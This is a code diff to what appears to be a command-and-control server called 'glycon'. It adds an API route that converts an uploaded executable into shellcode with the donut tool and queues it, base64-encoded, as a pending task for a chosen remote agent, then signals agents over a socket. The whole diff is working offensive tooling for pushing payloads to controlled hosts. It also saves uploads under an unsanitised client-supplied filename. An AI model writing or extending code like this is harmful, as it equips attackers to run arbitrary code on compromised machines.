@@ -6,6 +6,9 @@ from datetime import datetime
 import json
 import base64
 import traceback
+import tempfile
+import subprocess
+import uuid
 from werkzeug.security import generate_password_hash
 from glycon.secure_comms import SecureComms
 from glycon.config import CONFIG
@@ -588,3 +591,113 @@ def init_api_routes(app, socketio):
         finally:
             if conn:
                 conn.close()
+
+    @app.route('/api/shellcode', methods=['POST'])
+    @login_required
+    def generate_shellcode():
+        try:
+            if 'file' not in request.files:
+                return jsonify({"status": "error", "message": "No file provided"}), 400
+                
+            file = request.files['file']
+            if file.filename == '':
+                return jsonify({"status": "error", "message": "No file selected"}), 400
+                
+            entropy = request.form.get('entropy', '1')
+            arch = request.form.get('arch', '64')
+            args = request.form.get('args', '')
+            agent_id = request.form.get('agent_id')
+            
+            if not agent_id:
+                return jsonify({"status": "error", "message": "Agent ID required"}), 400
+                
+            # Create temp directory
+            temp_dir = tempfile.mkdtemp()
+            input_path = os.path.join(temp_dir, file.filename)
+            file.save(input_path)
+            app.logger.debug(f"Input path: {input_path}")
+            
+            # Generate unique output name
+            random_value = str(uuid.uuid4())[:8]
+            output_name = f"{os.path.splitext(file.filename)[0]}-{agent_id}-{random_value}"
+            output_path = os.path.join(temp_dir, output_name + '.bin')
+            app.logger.debug(f"Output path: {output_path}")
+            
+            # Build donut command
+            cmd = [
+                'donut',
+                '-e', entropy,
+                '-a', arch,
+                '-o', output_path,
+                '-f', '1',
+                '-p', args,
+                '-i', input_path
+            ]
+            app.logger.debug(f"Command: {' '.join(cmd)}") 
+            # Run donut
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            app.logger.debug(f"Donut output: {result.stdout}")  
+            app.logger.debug(f"Donut error: {result.stderr}") 
+            if result.returncode != 0:
+                raise Exception(f"Donut failed: {result.stderr}")
+            
+            # Verify shellcode was generated
+            if not os.path.exists(output_path):
+                raise Exception("Shellcode file was not generated")
+            
+            # Read generated shellcode
+            with open(output_path, 'rb') as f:
+                shellcode = f.read()
+            
+            # Create task for agent
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            
+            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
+                    (None, agent_id, 'shellcode', 
+                    json.dumps({'shellcode': base64.b64encode(shellcode).decode('utf-8')}),
+                    'pending', datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), None))
+            
+            conn.commit()
+            task_id = c.lastrowid
+            conn.close()
+            
+            # Clean up temp files
+            try:
+                if os.path.exists(input_path):
+                    os.remove(input_path)
+                if os.path.exists(output_path):
+                    os.remove(output_path)
+                os.rmdir(temp_dir)
+            except Exception as e:
+                app.logger.error(f"Error cleaning up temp files: {str(e)}")
+            
+            # Notify agent
+            socketio.emit('new_task', {
+                'task_id': task_id,
+                'agent_id': agent_id,
+                'task_type': 'shellcode'
+            })
+            
+            return jsonify({
+                "status": "success",
+                "task_id": task_id,
+                "message": "Shellcode generated and task created"
+            })
+            
+        except Exception as e:
+            # Clean up temp files if they exist
+            try:
+                if 'input_path' in locals() and os.path.exists(input_path):
+                    os.remove(input_path)
+                if 'output_path' in locals() and os.path.exists(output_path):
+                    os.remove(output_path)
+                if 'temp_dir' in locals() and os.path.exists(temp_dir):
+                    os.rmdir(temp_dir)
+            except:
+                pass
+                
+            return jsonify({
+                "status": "error",
+                "message": str(e)
+            }), 500
